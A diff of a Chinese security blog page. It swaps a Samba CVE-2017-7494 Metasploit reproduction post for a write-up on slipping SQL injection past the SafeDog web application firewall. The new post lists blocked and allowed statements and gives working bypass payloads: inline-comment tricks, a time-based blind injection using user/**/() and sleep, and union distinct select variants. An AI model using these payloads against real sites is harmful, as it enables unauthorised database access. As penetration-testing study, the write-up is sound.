@@ -15,32 +15,34 @@
 
 
 
-<meta name="description" content="废话：最近一直忙着写剧本写剧本写剧本（我不是安服吗？），直到今天才有空复现这个漏洞，以后还是要尽力多抽时间学习总结哈
+<meta name="description" content="前言：作为团队最水的菜鸡，上周终于有时间搞搞自己的事了。本篇文章主要总结绕狗过程中遇到的各种姿势和坑，由于不是专业绕狗选手，希望各位大佬不要嘲笑。
 
-0x00 漏洞信息2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。
-0x01 利用条件
-服务端共享目录有访">
+0x00 各种尝试被拦语句首先尝试了各种常用的payload，看看狗拦了哪些操作，发现如下语句会拦截：
+
+and 1=1/and ‘a’=’a’类型union select/union distinct select等user()、database">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Samba远程命令执行漏洞(CVE-2017-7494)攻击演示">
-<meta property="og:url" content="http://e4st.world/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/index.html">
+<meta property="og:title" content="打狗棒法-注入过狗姿势">
+<meta property="og:url" content="http://e4st.world/2017/09/24/打狗棒法-注入过狗姿势/index.html">
 <meta property="og:site_name" content="e4st' blog">
-<meta property="og:description" content="废话：最近一直忙着写剧本写剧本写剧本（我不是安服吗？），直到今天才有空复现这个漏洞，以后还是要尽力多抽时间学习总结哈
+<meta property="og:description" content="前言：作为团队最水的菜鸡，上周终于有时间搞搞自己的事了。本篇文章主要总结绕狗过程中遇到的各种姿势和坑，由于不是专业绕狗选手，希望各位大佬不要嘲笑。
 
-0x00 漏洞信息2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。
-0x01 利用条件
-服务端共享目录有访">
-<meta property="og:image" content="http://i4.buimg.com/1949/040f13e2e461c81fs.png">
-<meta property="og:image" content="http://i1.piimg.com/596268/0ad18a069d823548s.png">
-<meta property="og:image" content="http://i1.piimg.com/596268/fd7bf68fa83b6aebs.png">
-<meta property="og:updated_time" content="2017-06-04T09:45:31.000Z">
+0x00 各种尝试被拦语句首先尝试了各种常用的payload，看看狗拦了哪些操作，发现如下语句会拦截：
+
+and 1=1/and ‘a’=’a’类型union select/union distinct select等user()、database">
+<meta property="og:image" content="https://i.loli.net/2017/09/24/59c7ab77294f0.png">
+<meta property="og:image" content="https://i.loli.net/2017/09/24/59c7ad8e14c69.png">
+<meta property="og:image" content="https://i.loli.net/2017/09/24/59c7b80bccb38.png">
+<meta property="og:image" content="https://i.loli.net/2017/09/24/59c7b8b46f9ce.png">
+<meta property="og:image" content="https://i.loli.net/2017/09/24/59c7b9014a585.png">
+<meta property="og:updated_time" content="2017-09-24T13:57:35.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Samba远程命令执行漏洞(CVE-2017-7494)攻击演示">
-<meta name="twitter:description" content="废话：最近一直忙着写剧本写剧本写剧本（我不是安服吗？），直到今天才有空复现这个漏洞，以后还是要尽力多抽时间学习总结哈
+<meta name="twitter:title" content="打狗棒法-注入过狗姿势">
+<meta name="twitter:description" content="前言：作为团队最水的菜鸡，上周终于有时间搞搞自己的事了。本篇文章主要总结绕狗过程中遇到的各种姿势和坑，由于不是专业绕狗选手，希望各位大佬不要嘲笑。
 
-0x00 漏洞信息2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。
-0x01 利用条件
-服务端共享目录有访">
-<meta name="twitter:image" content="http://i4.buimg.com/1949/040f13e2e461c81fs.png">
+0x00 各种尝试被拦语句首先尝试了各种常用的payload，看看狗拦了哪些操作，发现如下语句会拦截：
+
+and 1=1/and ‘a’=’a’类型union select/union distinct select等user()、database">
+<meta name="twitter:image" content="https://i.loli.net/2017/09/24/59c7ab77294f0.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -72,7 +74,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Samba远程命令执行漏洞(CVE-2017-7494)攻击演示 | e4st&#39; blog</title>
+<title>打狗棒法-注入过狗姿势 | e4st&#39; blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -246,11 +248,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-Samba远程命令执行漏洞(CVE-2017-7494)攻击演示" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-打狗棒法-注入过狗姿势" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/" class="article-date">
-      <time datetime="2017-06-02T13:21:49.000Z" itemprop="datePublished">2017-06-02</time>
+      <a href="/2017/09/24/打狗棒法-注入过狗姿势/" class="article-date">
+      <time datetime="2017-09-24T12:25:04.000Z" itemprop="datePublished">2017-09-24</time>
 </a>
 
 
@@ -265,7 +267,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Samba远程命令执行漏洞(CVE-2017-7494)攻击演示
+      打狗棒法-注入过狗姿势
     </h1>
   
 
@@ -276,7 +278,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE/">CVE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bypass/">bypass</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -287,16 +289,30 @@
       
           
         <hr>
-<p>废话：最近一直忙着写剧本写剧本写剧本（我不是安服吗？），直到今天才有空复现这个漏洞，以后还是要尽力多抽时间学习总结哈</p>
+<p>前言：作为团队最水的菜鸡，上周终于有时间搞搞自己的事了。本篇文章主要总结绕狗过程中遇到的各种姿势和坑，由于不是专业绕狗选手，希望各位大佬不要嘲笑。</p>
 <hr>
-<h1 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a><strong>0x00 漏洞信息</strong></h1><p>2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。</p>
-<h1 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a><strong>0x01 利用条件</strong></h1><ul>
-<li>服务端共享目录有访问权限。</li>
-<li>服务端共享目录有写入权限。</li>
-<li>服务端共享目录的物理路径已知或者可猜解。</li>
-</ul>
-<h1 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a><strong>0x02 复现过程</strong></h1><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ docker pull medicean/vulapps:s_samba_1  //拉取或更新指定镜像</div><div class="line">$ docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1  //-d:以守护进程方式运行（后台）,-p &lt;HOT_PORT&gt;:&lt;CONTAINER_PORT&gt;：主机指定端口绑定容器指定端口</div></pre></td></tr></table></figure>
-<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a><strong>漏洞验证</strong></h3><p>1、msf更新至最新，已有相应的exp,查询is_known_pipename<br><img src="http://i4.buimg.com/1949/040f13e2e461c81fs.png" alt=""><br>2、选择该模块后我们show options，查看需要设置的参数，如下图所示，设置RHOST,target设为linux x86_64（对应测试环境）<br><img src="http://i1.piimg.com/596268/0ad18a069d823548s.png" alt=""><br>3、然后设置监听，设置完监听后，运行即可获取shell<br><img src="http://i1.piimg.com/596268/fd7bf68fa83b6aebs.png" alt=""></p>
+<h1 id="0x00-各种尝试"><a href="#0x00-各种尝试" class="headerlink" title="0x00 各种尝试"></a>0x00 各种尝试</h1><h3 id="被拦语句"><a href="#被拦语句" class="headerlink" title="被拦语句"></a>被拦语句</h3><p>首先尝试了各种常用的payload，看看狗拦了哪些操作，发现如下语句会拦截：</p>
+<blockquote>
+<p>and 1=1/and ‘a’=’a’类型<br>union select/union distinct select等<br>user()、database()等函数<br>…</p>
+</blockquote>
+<h3 id="放行语句"><a href="#放行语句" class="headerlink" title="放行语句"></a>放行语句</h3><p>在上面尝试中发现如下语句未被拦截：</p>
+<blockquote>
+<p>order by<br>select、union分开使用<br>and if<br>…</p>
+</blockquote>
+<h1 id="0x01-第一种思路"><a href="#0x01-第一种思路" class="headerlink" title="0x01 第一种思路"></a>0x01 第一种思路</h1><p>  先尝试绕过<code>and 1=1/and &#39;a&#39;=&#39;a&#39;</code>的限制<br>  这里可以使用内联注释进行绕过： <code>and /*!1*/=/*!1*/</code>即可绕过<br>  <img src="https://i.loli.net/2017/09/24/59c7ab77294f0.png" alt=""><br>  接着我们尝试一下利用时间盲注来进行绕过，我们先尝试一下正常的语句：</p>
+<blockquote>
+<p> ‘ and if(substr(user(),1,1)=’r’,sleep(5),1– -<br>  这个语句肯定会被拦截，因为含有user()等敏感函数，那么怎么绕过呢，我们试试user/**/()这样的形式<br> ‘ and if(substr(user/**/(),1,1)=’r’,sleep/**/(5),1– -<br>  <img src="https://i.loli.net/2017/09/24/59c7ad8e14c69.png" alt=""></p>
+</blockquote>
+<p>  这里安全狗没有拦截，网站响应时间是6s（没有sleep也有1s的响应，所以延时5s没有问题，虚拟机卡啊T_T）<br>  后续尝试发现，user%0a()也是可以绕过的。</p>
+<blockquote>
+<p>ps:这里提个问题，用这种形式的注入，如何注入到表中内容，暂时没有头绪，望大佬指教。</p>
+</blockquote>
+<h1 id="0x02-第二种思路"><a href="#0x02-第二种思路" class="headerlink" title="0x02 第二种思路"></a>0x02 第二种思路</h1><p>  回到刚才的问题，没有更进一步获取数据，还是把目光聚焦在<code>union select</code>的绕过。<br>  这里试过很多坑，但还是把尝试过的payload发出来，说不定另外的waf能过呢，也包含了一些mysql的特性：</p>
+<blockquote>
+<p>union /*!(select@1*/,2,3)  //select后面可跟@,!,~，如select!1,select~1<br>union/**//**/(/*!select@1*/,2,3)<br>union/*!/**/*//*!(select@1*/,2,3)<br>…</p>
+</blockquote>
+<p>  后来发现怎么也绕不过去，然后查询资料发现union select等价于union distinct select<br>  进行尝试，失败：<br>  <img src="https://i.loli.net/2017/09/24/59c7b80bccb38.png" alt=""><br>  继续尝试，给distinct加内联注释，失败：<br>  <img src="https://i.loli.net/2017/09/24/59c7b8b46f9ce.png" alt=""><br>  在distinct前面加上/**/,成功：<br>  <img src="https://i.loli.net/2017/09/24/59c7b9014a585.png" alt=""></p>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>  思路比较混乱，还需了解更多的数据库特性，还有正则表达式，才能深入了解过waf的思路技巧。</p>
 
       
     </div>
@@ -305,13 +321,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/">Samba远程命令执行漏洞(CVE-2017-7494)攻击演示</a></p>
+        <p><span>本文标题:</span><a href="/2017/09/24/打狗棒法-注入过狗姿势/">打狗棒法-注入过狗姿势</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">c0deeast</a></p>
-        <p><span>发布时间:</span>2017-06-02, 21:21:49</p>
-        <p><span>最后更新:</span>2017-06-04, 17:45:31</p>
+        <p><span>发布时间:</span>2017-09-24, 20:25:04</p>
+        <p><span>最后更新:</span>2017-09-24, 21:57:35</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/" title="Samba远程命令执行漏洞(CVE-2017-7494)攻击演示">http://e4st.world/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://e4st.world/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/　　作者: c0deeast" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/09/24/打狗棒法-注入过狗姿势/" title="打狗棒法-注入过狗姿势">http://e4st.world/2017/09/24/打狗棒法-注入过狗姿势/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://e4st.world/2017/09/24/打狗棒法-注入过狗姿势/　　作者: c0deeast" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -323,16 +339,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/09/24/打狗棒法-注入过狗姿势/">
-                    打狗棒法-注入过狗姿势
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/04/24/记一次奇葩的渗透测试/">
-                    记一次奇葩的渗透测试
+                <a href="/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/">
+                    Samba远程命令执行漏洞(CVE-2017-7494)攻击演示
                 </a>
             </div>
         
@@ -344,7 +354,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-漏洞信息"><span class="toc-number">1.</span> <span class="toc-text">0x00 漏洞信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-利用条件"><span class="toc-number">2.</span> <span class="toc-text">0x01 利用条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-复现过程"><span class="toc-number">3.</span> <span class="toc-text">0x02 复现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">3.0.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证"><span class="toc-number">3.0.2.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-各种尝试"><span class="toc-number">1.</span> <span class="toc-text">0x00 各种尝试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#被拦语句"><span class="toc-number">1.0.1.</span> <span class="toc-text">被拦语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#放行语句"><span class="toc-number">1.0.2.</span> <span class="toc-text">放行语句</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-第一种思路"><span class="toc-number">2.</span> <span class="toc-text">0x01 第一种思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-第二种思路"><span class="toc-number">3.</span> <span class="toc-text">0x02 第二种思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-总结"><span class="toc-number">4.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
         
     </div>
     <style>
@@ -380,7 +390,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Samba远程命令执行漏洞(CVE-2017-7494)攻击演示　| e4st' blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"打狗棒法-注入过狗姿势　| e4st' blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -400,15 +410,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/09/24/打狗棒法-注入过狗姿势/" title="上一篇: 打狗棒法-注入过狗姿势">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/04/24/记一次奇葩的渗透测试/" title="下一篇: 记一次奇葩的渗透测试">
+            <a href="/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/" title="下一篇: Samba远程命令执行漏洞(CVE-2017-7494)攻击演示">
                 <i class="fa fa-angle-right"></i>
             </a>
         
